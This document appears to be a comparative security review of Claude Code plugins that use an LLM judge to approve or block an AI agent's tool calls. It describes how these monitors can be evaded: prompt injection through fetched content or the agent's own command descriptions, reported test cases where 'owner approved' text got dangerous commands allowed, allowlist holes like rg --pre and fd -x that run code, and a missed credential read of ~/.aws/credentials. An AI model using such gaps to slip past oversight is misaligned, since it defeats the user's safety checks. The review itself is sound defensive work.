Zero dependencies, docs for architecture/security
cons: Matcher * adds latency to every tool call alongside gitnexus hooks; 12s timeout
Only 906 LOC, 0 stars, unproven; TYPESAFE_API_KEY only, OpenRouter needs endpoint+model tweaks
Does not auto-approve so it cannot reduce prompts

entries.name: yanmad27/ask-jev
entries.what: Claude Code plugin (hooks.json, zero npm deps, Node ESM) that calls Jev via POST {state, model, questions} to a systemone endpoint. Hooks: (1) PreToolUse AskUserQuestion auto-answers questions via deny+reason when confident (>=0.8, non-destructive, grounded); (2) PreToolUse "*" permission gate that fast-allows a static read-only tool list and otherwise asks Jev safe+destructive Noul questions, each with an auto-generated mirror (null-hypothesis) twin reconciled toward the safe side, then returns permissionDecision allow/ask; (3) PostToolUse Bash result classifier that injects additionalContext when the outcome is not success at p>=0.8; (4) Stop gate that blocks at p>=0.85 for incomplete work and, in full autonomy, auto-answers the assistant's closing question and re-prompts (max 3); (5) UserPromptSubmit that injects a reminder each turn plus a literal/ambiguous prompt judgement; (6) SessionStart that injects a rule block and self-registers an AskUserQuestion hook into ~/.claude/settings.json. Also bin/jev.mjs CLI (stdin JSON -> raw answers, plus stats), a skill ask-jev, a stats log at ~/.claude/ask-jev.log, and a Paseo plugin. State sent to Jev is built from the transcript, CLAUDE.md, memory, git diff, and the permission lists.
entries.autoInvocation: Deterministic hooks: PreToolUse, PostToolUse, Stop, UserPromptSubmit and SessionStart fire automatically with no need to say 'use jev', which is exactly the user's goal. The skill and CLI path is model-driven and opt-in by reminder text. There are no MCP tools, so nothing for the model to forget to call.
security: Key handling is good: the key goes in the Authorization header via fetch, never in argv. It is read from env or ~/.claude/ask-jev.key, and there is no shell exec of user data. Only fixed git commands run through execFileSync (context.mjs:270; jev.mjs:61 execSync of a fixed 'git config --get remote.origin.url' string).
The key file is not created by the plugin and no telemetry endpoint exists. The only fetch is in lib/jev.mjs:172, to the configured URL.

self-register.mjs rewrites ~/.claude/settings.json on every SessionStart (line 43-63) to insert a PreToolUse hook pointing at the plugin cache path. It reformats the file with JSON.stringify and could clobber comments or ordering, and it is a persistent side-effect outside the plugin sandbox. It is justified in-code by claude-code#36397, which may be stale on 2.1.285. It also produces duplicate hooks, mitigated by a lock file.

Prompt-injection surface: the whole transcript, tool results (300 chars each), file diffs, CLAUDE.md and memory go into Jev's state. The permission gate turns Jev's probability into an allow that bypasses the user prompt. An injected instruction in a fetched page or file could raise p(safe) or lower p(destructive), and the brief notes injected state can move answers. The mirror/twin reconcile reduces but does not remove this. Allow is issued from PreToolUse, so it skips the permission dialog but should not override deny rules or the existing no-secret-leak hook's deny.

Default autonomy=full is aggressive: allow at destructive<0.3 even if safe<0.8, the stop gate auto-answers the assistant's own question and continues (up to 3 times), and the prompt gate injects 'do not ask, state assumptions and proceed'. This conflicts with a cautious posture on client projects.

Sensitive-file redaction is only for git diff hunks (SENSITIVE_PATH regex .env/.pem/.key/secret, context.mjs:254). Transcript text, CLAUDE.md and memory are sent verbatim, so any secret pasted or printed in the conversation reaches the provider. The tool-result cap is 300 chars.
entries.dataEgress: On every non-read-only tool call (Bash, Edit, Write, MultiEdit, Agent, MCP write tools), each Stop, each UserPromptSubmit of 12 or more chars, and each Bash PostToolUse, it POSTs up to 70,000 chars of state to the configured endpoint. State comprises: CLAUDE.md files (project, user, memory; 8k budget), recent conversation turns and the last user messages, session_summary, the todo/plan file (4k), the action (full Bash command up to 4k; Edit/Write before/after contents up to 4k each; the final assistant message), git status, diff (6k, redacted for sensitive filenames) and ls-files (60 files), the allow/deny lists from settings.json, the cwd, and the plugin's own past decision log. It goes to api.typesafe.ai by default, or to OpenRouter once ASK_JEV_API_URL is set. This is much broader than the cookbook's two-question Bash-command-only check. Locally it writes ~/.claude/ask-jev.log and tmp lock/count files.
entries.failureMode: Mostly fail-open to the normal flow. Network error, 4xx, timeout, or a missing key all result in the hook printing nothing (`.catch(() => null)` / `main().catch(() => {})`), so Claude Code falls through to its normal permission prompt, the Stop proceeds, and the question reaches the user. The client retries 5xx/429 with backoff inside a 4s budget (jev.mjs:278-303), and the hooks.json timeouts exceed the budgets (6s vs 4s; the stop gate at 16s for up to 3 sequential 4s calls plus margin). A hook killed by timeout is also non-blocking. The safe-side asymmetry is real: the destructive floor at 0.6, mirror reconcile pulling toward the safe side, and undefined p means ask. The unsafe direction is when Jev returns confident-but-wrong (overconfident, per independent evals): a wrong allow silently skips a prompt, and a wrong stop block or auto-continue only costs a turn. Disagreement is not a loud failure, and the only trace is the log file. Skips the permission gate in bypassPermissions, but the ask, stop, prompt and bash gates still run in bypass sessions.
entries.contextCost: Zero MCP tools. The skill listing is one skill whose description is about 400 chars (~100 tokens, well under the 0.02 budget). SessionStart injects a rules block (~1.7k chars, ~430 tokens) once per session, and UserPromptSubmit injects the REMINDER (~1.1k chars, ~280 tokens) on EVERY user prompt unless ASK_JEV_REMIND=0, plus a one-line Jev directive in full mode. That is cumulative and it competes with the caveman additionalContext. The PostToolUse Bash hook adds a short line only when a command is judged not-success. The Stop hook's block reasons re-enter context as a new turn. Recommend REMIND=0 to remove the per-turn cost.
pros: Fully automatic via hooks with no 'use jev' prompting (hooks/hooks.json), and covers AskUserQuestion auto-answering, permission gating, a Stop gate and Bash result classification in one plugin.

Endpoint and model are overridable (jev.mjs:117-119, ASK_JEV_API_URL/ASK_JEV_MODEL) and the wire format is the same TypeSafe systemone schema OpenRouter exposes, so it can be pointed at openrouter.ai/api/v1/systemone with jev-1.13 with a settings.json env change and no code patch.

Better-than-cookbook safety design: static read-only fast-allow with no network, dual safe and destructive Noul questions with a 0.6 destructive floor, mirror/null-hypothesis twin questions reconciled toward the safe side (jev.mjs:247-261), and detailed destructive/reversible criteria (gate.mjs) that include credential exfiltration and ~/.claude/settings edits.
Fail-open-to-prompt on all errors, with timeouts budgeted below hooks.json timeouts. Self-skips the permission gate in bypassPermissions. Missing key means the plugin does nothing.

Zero dependencies, and the source is readable and heavily commented. 8 unit test files (~1.5k lines), CI, behavior evals, release-please, and an auditable decision log with a stats CLI. Active development (73 commits in 12 days, v1.5.0) and it reads user allow/deny lists to avoid flagging allow-listed commands.
Secret-aware diff redaction, and the git remote URL has the token stripped before logging.
cons: Default ASK_JEV_AUTONOMY=full allows any tool with destructive p<0.3 even when p(safe) is under threshold, auto-answers the assistant's own questions in the Stop gate, and injects 'do not ask, proceed on assumptions' every prompt. This deviates from the cookbook's allow-only-if-both>=0.9 and from the candidate summary, which mis-states the default. Must be set to ASK_JEV_AUTONOMY=safe for parity, and even then the allow threshold is 0.9 on safe only.

Matcher '*' on PreToolUse fires on every non-read-only tool including Edit, Write, Agent and MCP calls, adding a network round trip each time and sending Write/Edit contents and a 70k-char state to a third party each time. That is a wide egress surface for client projects, with the secret redaction covering git diffs only.

Allow comes from PreToolUse, which skips the prompt (auto mode's classifier and user prompt), so an overconfident or injected Jev wrongly approves silently. No PermissionRequest integration that would leave the normal prompt as the fallback, unlike the cookbook design.

self-register.mjs mutates ~/.claude/settings.json on each SessionStart based on a claude-code#36397 workaround that may be obsolete on 2.1.285 and creates duplicate AskUserQuestion hooks. It also conflicts with a hand-managed settings.json.
Per-turn UserPromptSubmit reminder and an extra Jev call per prompt/Stop/Bash-result add latency and context that the user likely doesn't want. The bash and prompt gates are low value.

No license, 0 stars, 12 days old, single maintainer, Vietnamese-language code comments; no OpenRouter mention and OPENROUTER_API_KEY is never read (needs ASK_JEV_API_KEY duplication), so the key must be duplicated into a key file or env, and the existing no-secret-leak hook's protected-var list should cover ASK_JEV_API_KEY as well. Hook commands use bare 'node', which needs the user's PATH.
Independent Jev caveats (overconfidence on unanswerable inputs, prompt injection sensitivity, /alpha no SLA) apply to a plugin whose main effect is turning probabilities into auto-approval.
entries.verdict: Closest existing match to 'Claude Code uses Jev automatically': deterministic hooks, OpenRouter-switchable via ASK_JEV_API_URL/ASK_JEV_MODEL/ASK_JEV_API_KEY with no code change, a safer-than-cookbook decision design, fail-open behavior and real tests. But it ships a too-permissive default (autonomy=full), a wide '*' PreToolUse egress of up to 70k chars per call, a settings.json-mutating self-register, and no license. Adopt only as a reference or a fork/pinned vendor copy, configured with ASK_JEV_AUTONOMY=safe, ASK_JEV_GATES=permission (and maybe stop), REMIND=0, and a narrowed matcher (Bash), rather than installing as-is.
entries.license: None (GitHub licenseInfo null and no LICENSE file in tree), so all rights reserved by default

judge.why: Richest plugin (permission gate with mirror-twin questions, AskUserQuestion auto-answer, Stop gate, Bash classifier) and OpenRouter-switchable with env only. Defaults are too permissive and it is too invasive to install as-is; borrow the design or run permission-only with autonomy safe.
pros: Fully automatic hooks. Mirror/null-hypothesis twin questions reconcile toward the safe side, with a destructive floor of 0.6
Fail-open with timeouts under the hook timeouts; skips the permission gate in bypass; 73 commits, about 1.5k lines of tests, CI
Zero dependencies; a stats CLI and decision log
cons: Default ASK_JEV_AUTONOMY=full allows when destructive p < 0.3 even with low p(safe), auto-answers the assistant's own questions, and injects 'do not ask, proceed' every prompt; set safe, gates=permission and REMIND=0
Matcher '*' sends up to 70k chars per call (CLAUDE.md, memory, transcript, Write/Edit bodies); redaction covers git diffs only
The plugin self-registers into ~/.claude/settings.json on every SessionStart, and there is no license
Its allow comes from PreToolUse and may pre-empt the native classifier. In bypass the permission gate is skipped, leaving the stop, prompt and bash gates
Bare `node` commands need PATH; the repo is 12 days old with a single maintainer

entries.name: agent-reflex (rutvikchandla3)
entries.what: Zero-runtime-dependency TypeScript PreToolUse hook (matcher "*") for Claude Code. Order: config regexes, then hardcoded catastrophic-deny and read-only-allow rules (rules.ts), then ONE POST to {base}/v1/systemone with a compact state (action, project_dir) and ~10 typed questions: risk Score 0-4, category Choice (11 options), 8 Noul signals (7 for non-edits, plus removes_safeguard for edits), and on_task fed with the last user prompt read from the transcript. policy.ts thresholds the answers into allow/ask/deny. Any error returns defer (empty stdout), so Claude Code's normal flow applies. It also has an optional local dashboard/HTTP server, a JSONL decision log, and a 100-case bench.
entries.autoInvocation: Deterministic PreToolUse hook on matcher "*", so it fires on every tool call with no model prompting. This is the closest match to the user's "never say use jev" requirement among Jev integrations, but it is a gate, not an assistant.
security: Key handling is good: the key comes only from env and goes only in the Authorization header, never argv. Errors echo at most 300 chars of the response body.

Project-level config is trusted (config.ts:165): a cloned repo's .agent-reflex.json is merged over user config. A hostile client repo can set allowPatterns (auto-allow any matching shell command, reflex.ts:166), onError:"allow", or loosened thresholds. A crafted denyPatterns/allowPatterns regex is compiled with new RegExp on every call, so it is a ReDoS surface, and an invalid one throws outside the try block. Relevant to the user's client projects.

Silent-allow risk: an `allow` from PreToolUse skips the permission prompt. In the user's defaultMode "auto" (my inference, not verified against Claude Code docs) this likely replaces the built-in classifier with an overconfident, steerable Jev.

Prompt-injection surface: the agent-authored Bash `description` is forwarded as agent_says_it_is (action.ts:70), and command and file content are clipped to 2000-2500 chars into state. The agent, or a poisoned README that steers it, can therefore write text aimed at the judge. The README concedes Jev can be steered.

Read-only fast path holes (rules.ts:214-217): rg --pre, fd -x/--exec, sort -o, tree -o, git diff/log --output and --ext-diff are unblocked allowlist commands that can run code or write files, and are auto-allowed with no model call. `task` (subagent spawn) and exitplanmode are always allowed (rules.ts:208-211).
Catastrophic-deny is narrow (rm on / or ~ only, mkfs, dd, fork bomb). Anything else depends on Jev.
entries.dataEgress: On every non-fast-path tool call (all non-read-only Bash, Write, Edit, WebFetch, MCP tools, and so on), the following go to the configured base URL, which would be OpenRouter and then TypeSafe: (a) the full Bash command up to 2000 chars plus the agent's description; (b) Write content up to 2500 chars, or up to 5 edit hunks as added/removed lines (200 chars each, 40 lines max) plus any patch up to 2500 chars; (c) WebFetch url plus prompt; (d) other tools' full input JSON up to 2000 chars; (e) file paths and project_dir (the absolute cwd); (f) the user's last prompt in full, read from the transcript tail, as the on_task instruction (questions.ts:248-256). File contents on Read are not sent, but Write and Edit contents are, which can include secrets and client code. No data goes to any other endpoint.
entries.failureMode: Defaults to defer (config.ts:148), which prints nothing so Claude Code's normal permission flow applies. The missing-key, network, HTTP and timeout cases all end up in the try/catch at reflex.ts:147. A hook crash exits 70, which is non-blocking in Claude Code. Timeouts: 4s per attempt, 2 retries with backoff on 429/5xx (jev.ts:76-105), so the worst case is about 12-13s against the 15s hook timeout, and an OpenRouter outage stalls each tool call by that long. Config can set onError to allow or deny. The failure mode is safe to the prompt, but not fail-closed.
entries.contextCost: Zero MCP tools and no skill. The hook returns no additionalContext. Only the deny or ask reason string is surfaced (deny goes to Claude, and the reason is short). No token cost in the main context.
pros: Broadest coverage of Jev-as-gate: matcher "*" covers Bash, Write/Edit, WebFetch and MCP tools. The official cookbook only covers Bash.

Well-structured design: typed questions with signals, thresholds and invariants in code (writes outside the project always ask, jev/policy.ts:266-326, reflex.ts:141), secret exfiltration and on_task checks, code-computed diffs. Deterministic rules run before any model call.
Base URL is env-configurable and the client matches OpenRouter's /v1/systemone path, so it can be pointed at OpenRouter with no code edit (jev.ts:74).
Safe default failure: defer on any error, and no context tokens injected. Zero runtime dependencies, key never in argv, no telemetry, local-only logging.
Has unit tests plus a 100-case bench with holdout, and configurable thresholds and patterns.
cons: Very immature: 1 commit, 1 contributor, 0 stars, 3 days old, no release. The 98% bench accuracy is self-reported and was never run on OpenRouter.
Model default "jev-latest" is unlikely to work on OpenRouter and is not env-overridable. It needs a config file, plus a key-mapping wrapper because it reads only TYPESAFE_API_KEY/JEV_API_KEY.
Silent allow on steerable, overconfident Jev output, and the agent's own description is fed to the judge. In auto or bypass sessions an allow may override the built-in safeguards (my inference).
A project-level .agent-reflex.json in a cloned repo can override allowPatterns, onError and thresholds. This is a real hazard for client and untrusted repos.
Sends command text, Write/Edit contents and the user's full last prompt to a third party (OpenRouter and TypeSafe) on every gated call. That is a client-confidentiality concern.

A retry-heavy timeout profile (~13s worst case) blocks tool calls when OpenRouter's /alpha endpoint is down. Read-only allowlist has code-exec/write holes (rg --pre, sort -o, fd -x). No test for jev.ts.
entries.verdict: Best-designed general Jev permission gate found so far and it can be pointed at OpenRouter with an env wrapper plus a one-line config, with safe defer-on-error and zero context cost. But it is a 3-day-old, single-commit repo that would silently allow on a steerable model and trusts per-repo config, so it needs hardening (pin the model, ignore project config, run it in ask-only or shadow mode first) before running it on client projects.

judge.why: Broadest typed-question design (risk score, category, 8 Noul signals, on_task) across all tools, defer on error. But it is 3 days old, and it trusts project-level config in cloned repos, which is a hazard on client repos.
pros: matcher '*' covers Bash, Write, Edit, WebFetch and MCP; deterministic rules before the model; defer (normal flow) on any error
Zero runtime deps; a 100-case bench with holdout (self-reported 98%, never on OpenRouter)
Base URL env-configurable
cons: A cloned repo's .agent-reflex.json can set allowPatterns, onError:allow and loosened thresholds; ReDoS surface
Silent allow can replace the native classifier; the agent's own description is fed to the judge; the fast path auto-allows code-exec/write holes (rg --pre, sort -o, fd -x)
Retry profile up to about 13 s against a 15 s hook timeout; sends Write/Edit content and the full last prompt
1 commit, 0 stars, no test for jev.ts; the key needs a wrapper script

entries.name: eugeniughelbur/jev-engineering (jev-gate plugin + layer + MCP server)
entries.what: Claude Code plugin whose core is jev-gate: a deterministic PreToolUse hook (matcher Bash|Edit|Write|NotebookEdit, 8s timeout) that runs hard-deny regexes, then a read-only fast-path allowlist, then ONE POST to OpenRouter System One asking two typed questions (Noul 'destructive' and Choice allow/ask/deny), and maps the probabilities to allow/ask/deny by thresholds. Modes: observe (default, log only), auto, guard, enforce. Also ships an optional 5-tool MCP server (check_action, route_turn, keep_context, rank_options, gate_stats), a layer.py CLI (route/rank/keep), slash commands, a local HTTP service, a GitHub Action (review-router) and use-case scripts (inbox triage, etc.). It is a permission/safety gate, not a coding-productivity tool.
interface: layer.py route|rank|keep, serve.py, pool.py, calibrate.py, policy.py, packs.py, attack_test.py
entries.autoInvocation: Deterministic hook (PreToolUse on Bash|Edit|Write|NotebookEdit) - fully automatic, no prompting needed. The MCP tools are model-discretion only and the README itself says a hook is preferable for enforcement. Default mode is observe (log only) so it does nothing visible until /jev-on.
security: No API key in argv: key read from env only (jev_gate.py:189) and sent in Authorization header; OK. But README tells user to put the key in ~/.claude/settings.json env, which exposes it to every hook/Bash child process; service/install.sh writes the key into a launchd plist ($KEY at line 50, plaintext on disk)

Every gated command is appended UNREDACTED to ~/.jev-gate/decisions.jsonl (jev_gate.py log(): 'command': command) - commands containing inline tokens/passwords persist in plaintext; pool.py claims to redact when sharing

Prompt-injection surface: the last user message (2000 chars) and the command text are placed into Jev 'state'; authors' own test shows polite 'owner approved' injections got 1-3 of 30 dangerous commands to allow in the model step (results/2026-09-20-injection-test.md); blunt injection flips safe commands to deny (DoS on own builds). Mitigated by hard-deny regexes before the model

Fast-path allowlist is regex based; policy.json fast_path/hard_deny come from a remote JEV_POLICY_URL if the user runs policy.py pull (unauthenticated URL fetch, only regex/threshold validation) - a poisoned team policy could allowlist dangerous commands; layers can only tighten thresholds

Hook does no shell exec of user data: pure regex + urllib to a fixed https endpoint (JEV_ENDPOINT override via env). No subprocess/os.system in the hook path (grep). No npm/postinstall; no curl|sh (only service/install.sh, a local script)

In auto mode a model 'allow' returns permissionDecision allow, which suppresses Claude Code's prompt; its own benchmark: misses on cat ~/.aws/credentials until a rule was added afterwards (results/2026-09-28...md); self-declared 'catches mistakes, not a determined attacker'
entries.dataEgress: To openrouter.ai/api/v1/systemone (then TypeSafe as model provider) on every non-fast-path Bash/Edit/Write/NotebookEdit call: the full Bash command string (may contain inline secrets, paths, URLs), for Edit/Write/NotebookEdit only 'Tool /file/path' (describe() sends file_path or first 400 chars of tool_input JSON, so Write content is not fully sent but may be partially for tools without file_path), the last human user message (up to 2000 chars, read from transcript_path), and cwd. Fast-path read-only and hard-deny commands send nothing. Not sent: file contents, diffs, assistant reasoning, prior tool outputs (build_state comment jev_gate.py:~119). Optional MCP tools send whatever the model passes (keep_context ships arbitrary context items/tool results). The user's existing secret-leak guard runs independently but is not integrated. Client projects: commands + user prompt text leave the machine to a beta third-party model, which may matter under client NDAs.
entries.failureMode: Fail-open: any URLError/HTTPError/timeout/ValueError/missing key returns verdict 'ask' with source 'fallback', which in every mode except enforce prints nothing and exits 0 so Claude Code's normal permission flow applies (malformed stdin also exits 0). HTTP timeout 5s (JEV_GATE_TIMEOUT), hook timeout 8s. In enforce mode a fallback 'ask' becomes exit 2 (fail-closed, blocks). Caveat: KeyError on unexpected response shape (payload['answers']['destructive']['noul'], no try/except in decide()) would crash the hook with a traceback and non-zero exit 1, which Claude Code treats as non-blocking error, so effectively fail-open but noisy.
entries.contextCost: Plugin hook: zero tools, no MCP instructions, no injected text into context (hook only emits a permissionDecisionReason on allow/deny). Slash commands add nothing unless invoked. If the optional MCP server is also added: 5 tools, roughly 2.1k chars of docstrings+signatures = ~525 tokens plus JSON schema overhead (est. 0.8-1k tokens total); README mentions only 3 tools but source has 5.
pros: Only candidate here that is truly automatic: a PreToolUse hook that fires with no prompting, matches the user's 'Claude Code must use it when needed' requirement
Uses OpenRouter by default and by design: jev_gate.py:53 endpoint openrouter.ai/api/v1/systemone, model typesafe/jev-1.13, OPENROUTER_API_KEY first, so no patching needed
Sensible architecture: deterministic hard-deny (10 rules) and read-only allowlist run before any network call, so most calls cost 0 and add ~0 latency; Jev only sees ambiguous ones
Correct fail-open behaviour with 5s HTTP timeout under an 8s hook timeout; stdlib-only python, no deps, no npm/postinstall
Small data footprint by design: sends command + last user message + cwd, explicitly not assistant reasoning or tool outputs or file contents
Honest, reproducible public benchmarks including one where Claude Code's auto mode wins on smoothness (12/12 safe vs 9/12) and its own misses, plus tests in CI
Zero context cost (no MCP server needed); observe-by-default lets user measure decisions in ~/.jev-gate/decisions.jsonl before enabling; cost ~$0.00002/check
Quick to trial: two plugin commands, and can be disabled with /jev-off or removing the plugin
cons: It is a safety/permission gate, not a Jev value-add for coding quality: with the user in bypass/auto permission mode its 'allow' output is largely moot and only its 'deny' has any effect, so benefit reduces to a second, weaker secret-leak/destructive-command guard that overlaps the existing PreToolUse secret guard
Extra 280-500 ms (p95 ~530 ms, timeouts to 5 s) on every non-allowlisted Bash, and on every Edit/Write/NotebookEdit since fast-path is Bash-only; noticeable in long agentic loops

Sends every ambiguous Bash command string and the last user prompt (2000 chars) from personal AND client repos to OpenRouter/TypeSafe; commands with inline secrets are exposed, and the same commands are written unredacted to ~/.jev-gate/decisions.jsonl

Model step is manipulable and noisy: authors' own test shows 1-3/30 dangerous commands allowed under polite authority injections, blunt injection flips safe commands to deny, and a real miss (cat ~/.aws/credentials) was patched only after a benchmark; scores drift between model versions (force push returned deny 0.94 then ask 0.78)

Very immature and single-maintainer: created 2026-09-20, 39 commits, 1 contributor, 5 stars, plugin v0.1.0/pyproject 0.2.0 mismatch, README's 'pip install jev-engineering' returns 404 on PyPI, MCP server has 5 tools while README says 3
Hook runs arbitrary code from a week-old repo on every tool call; must pin a commit and audit updates

route_turn and keep_context are irrelevant/impossible inside Claude Code (a tool cannot switch the main model or prune the harness context); rank_options/check_action rely on model discretion and the README concedes MCP tools are not enforceable

Much of the value (review-router GitHub Action, inbox triage, Slack follow-ups) is outside Claude Code daily coding; nothing here uses Jev for code intelligence, test selection or edit decisions inside a session (ci-test-selection is a CI script)
Unhandled KeyError path on unexpected API response shape can emit a traceback from the hook
entries.verdict: The only automatic, hook-based Jev integration with OpenRouter as default, well-engineered fail-open design, but it solves permission gating, which mostly duplicates the user's existing secret guard and is neutralised by bypass/auto mode, while adding per-call latency and shipping commands/prompts (including client work) to a beta model. Worth a pinned, observe-only trial (or cherry-picking its hard-deny rules and the Noul/Choice question pattern into the user's own hook), not an install-and-enable for daily use.

entries.name: getexcited/stepwarden
entries.what: Claude Code plugin built on the early-access "function hooks" API (TypeScript module, no npm deps). Before every non-skipped tool call (tool.call hook) it sends the tool name, redacted args, the session's first prompt (used as the "plan") and the last 8 calls to TypeSafe's System One API. It asks 5 typed questions in one request: 4 Noul (contradictsPlan, outOfScope, contradictsPrevious, shouldFlag) and 1 Score (intentConsistency 0-4). A threshold policy then allows, asks the human via $.ui.ask (at p>=0.6 or intent<=1), or blocks (p>=0.9). It ships in audit mode (logs only, never blocks). It writes a JSONL audit log to .claude/stepwarden/. It has a /stepwarden command with enforce, audit, off, toggle and help.
entries.autoInvocation: Deterministic hook. It is a tool.call function hook that fires on every non-skipped tool call, with no model discretion and no need to prompt. The user never has to say "use jev". This fits the "automatic" requirement, but only as a guardrail, not as a decision helper for the agent.
security: Key handling is good. The key is a sensitive userConfig field stored in the OS keychain, or read from env via $.env.get. It is sent in-process via $.http.fetch as a Bearer header, so it never appears in argv or the process list, and the plugin spawns no subprocess.

Sandboxed by design: the loader statically forbids node: builtins, npm imports and subprocesses (verify.ts header, README Threat model). The only network destination is api.typesafe.ai, with no telemetry.

Redaction of arguments is pattern-based (lib/redact.ts): key names like password/api_key/secret, KEY=value, bearer tokens, PEM blocks, JWTs. Strings are capped at 600 chars, arrays at 20 items, depth 4. The README admits unusual secret shapes leak. The plan (first user prompt) is sent NOT redacted, capped at 2000 chars.

The same redacted args are written to .claude/stepwarden/<session>.jsonl inside each project (default on). This is a leak and gitignore risk on client repos. The README recommends adding it to .gitignore.

Prompt-injection surface: tool-call args and the plan go verbatim into the Jev state. The README concedes injection aimed at the verifier is an open problem. Jev returns only typed probabilities, so its output cannot inject the agent, but it can be gamed into a false allow.
Function hooks fail open: a hook that throws, or a module that fails to load, silently lets the tool run. There is no curl|sh, no postinstall and no lockfile. Single author, unsigned commit.
entries.dataEgress: For every verified tool call (Bash, Edit, Write, MultiEdit, MCP tools, etc.; Read/Glob/Grep are skipped by default), the plugin sends this to api.typesafe.ai, not OpenRouter: (1) the tool name and its args, redacted and truncated (600 chars per string, 20 items, depth 4). For Edit/Write this includes old_string/new_string/content snippets, so client code fragments leave the machine. For Bash it includes command text. (2) The first user prompt of the session verbatim, up to 2000 chars, unredacted. (3) The name and args of the last 8 calls. Tool outputs and file contents read by Read are not sent, but they can appear indirectly in later args. It sends about 740-1,200 input tokens per call. On client projects this is third-party processing of code and command text, and needs client sign-off.
entries.failureMode: Fail-open by default (onError=allow, onNoAnswer=allow). The timeout is 5000 ms (timeoutMs), implemented by racing $.http.fetch against $.clock.sleep, so a hung Jev can stall each tool call for up to 5 s. Missing key, HTTP errors (401, 429, 5xx) and schema drift are all counted, audited and turned into the onError action. After 3 consecutive failures (unhealthyAfter) it shows a toast. onError=deny makes it fail closed but would halt all work in an outage. In audit mode nothing is ever blocked whatever the verdict. Function-hook throws or module-load failures fail open silently. In non-interactive (-p) runs, flagged calls use onNoAnswer.
entries.contextCost: Effectively zero tokens in the model's context. It has no MCP tools and no skills, and I found no additionalContext injection. The hook only emits UI toasts/logs (not sent to the model), except that a block returns a short reason string in place of the tool result. That block text is the only text the model ever sees. The cost is wall-clock latency and Jev tokens ($0.042/1M input, negligible), not context.
pros: Truly automatic and deterministic: a tool.call hook needs zero prompting and adds zero context tokens.

Well-engineered defensive design. It ships in audit mode, logs every verdict with per-question probabilities, has configurable fail-open/closed behaviour, health counters, and a wire-format guard that throws on schema drift (lib/jev.ts:133-167).

The only candidate found that actually exercises Jev's typed Noul/Score primitives against Claude Code's own event stream. It is a working reference for the wire format (request {model,state,questions}, answers {type:noul|score}).
The API key is not in argv and is stored in the OS keychain. The sandboxed hook module can't spawn processes or read other env vars. There is no npm/postinstall and no curl|sh.

It adds a semantic safety net exactly where the user runs bypass/auto permission mode. It may catch out-of-scope or destructive calls, and the audit log lets thresholds be tuned on real traffic before enforcing.
Apache-2.0, small (about 140 KB), easy to read and fork; the OpenRouter patch is a few constants.
cons: TypeSafe-direct only (api.typesafe.ai hardcoded, lib/jev.ts:29-31, TYPESAFE_API_KEY). No OpenRouter support, so it needs a fork and the OpenRouter systemone schema parity is unverified. The user wants OpenRouter as the provider.

It depends on Claude Code function hooks, an early-access feature behind CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=1 whose field names changed during preview. I could not confirm 2.1.285 support. Types need regenerating after each update.
It is a PoC by a single author: one commit, 2 stars, no CI, no lockfile, created 12 days ago. The README itself says 'not a security boundary' and that the thresholds are untuned.

The 'plan' is only the first prompt of the session. Long sessions drift, so the contradictsPlan/outOfScope signals become noisy or wrong. The README admits this. A vague first prompt such as 'fix the bug' makes the plan-based signals low-signal and false-positive prone.

Egress on client projects: Bash commands, edit content snippets, the raw first prompt and 8 calls of history go to a third party for every write/exec call. Regex redaction is imperfect. It also writes a per-project JSONL audit log of args, a leak risk in client repos.

It adds roughly 0.5 s blocking latency to every Bash/Edit/Write/MCP call, up to 5 s on timeout. The user already has PreToolUse secret-guard, GitNexus and caveman hooks. This becomes a fourth serial gate and overlaps with the secret guard.

It is a verifier only. It gives Claude Code no Jev-powered decisions for routing, choice or classification, so it doesn't satisfy 'use Jev when it adds value' beyond safety gating. Jev accuracy is below frontier (67.8% vs 74.1% per the README) and repeated calls vary by a few points. Ask dialogs would be annoying in a bypass/auto workflow.
It fails open on hook throw or load failure, so it gives no hard guarantee.
entries.verdict: This is a real, well-built, automatic Jev integration, but it only does one job (gating tool calls for safety). It needs a TypeSafe key (no OpenRouter path without a fork), an early-access function-hooks feature, and it sends command and edit snippets to a third party on every call. Run it in audit mode only, on personal projects, if the user wants Jev telemetry; do not make it the core integration, and don't enforce it on client work.

entries.name: Talya1412/jev-harness
entries.what: Apache-2.0 TypeScript monorepo (14 packages) of TypeSafe Jev integrations. Relevant for Claude Code: (a) packages/claude-code, a plugin with two command hooks, a PreToolUse destructive-call gate for Bash|Write|Edit|NotebookEdit that hard-denies at p>=0.5, and a UserPromptSubmit skill advisor that is inert unless JEV_SKILLS_JSON/FILE is set; (b) packages/mcp, a stdio MCP server with 12 jev_* tools (README says 7 in the top table but lists 12; the TOOLS array has 12); (c) a core client, jev/jev-gate CLIs, eval tooling, GitHub Actions, and OMP/Pi/VS Code adapters that are not relevant here.
entries.autoInvocation: Hook: deterministic PreToolUse on every Bash|Write|Edit|NotebookEdit call, which is the only truly automatic path and the closest thing to 'Claude Code uses Jev without being asked'. Skill advisor: deterministic UserPromptSubmit hook, but useless until you hand it a roster. MCP: model-discretion only; nothing tells Claude when to call jev_* tools (no server instructions, generic descriptions), so it would rarely be used without a prompt or a CLAUDE.md rule.
security: API key is read from env only (kit/src/config.ts) and never put in argv. The README's 'Bearer' header goes over HTTPS to whatever TYPESAFE_BASE_URL is, so a wrong base URL sends the key elsewhere. The plugin.json userConfig.apiKey (sensitive) is declared but the hook code never reads it (grep of hooks/*.ts finds only process.env), so the userConfig key is dead config and only the env var works.

Hook redaction is on by default (core/src/redact.ts: AWS keys, JWTs, private keys, GitHub/Slack tokens, sk- keys, auth headers, env assignments, URL creds, connection strings, emails). It is regex-based, fail-open (if redaction throws, the original state is sent, client.ts), and the MCP path deliberately disables redaction.

Hard rule for gate: hook DENIES (not asks) on p>=0.5, so any false positive blocks Claude with no escape path other than editing env. core/src/patterns.ts:279-286 itself documents that a plain 'python3 script.py' was blocked at 0.84 by the single-noul gate. The repo has a judgeDestructiveDual (block/confirm/allow) but the CC hook uses the single-noul judgeDestructive.
Fail-open by construction means an attacker or outage bypasses the gate; it is advisory, not a security control. It also does not replace your secret-leak guard.

Prompt-injection surface: the model output is only numeric probabilities used against a threshold. The hook and MCP never feed free text from Jev back except a fixed template, which is a small surface. The tool_input being judged is attacker-controllable text that could argue for its own classification; the repo has a 'steering' slice in its holdout set, self-reported.
No telemetry, postinstall scripts or curl|sh found (grep). Only child_process is execSync git diff in the CLI jev-gate, not in the CC plugin or MCP server.
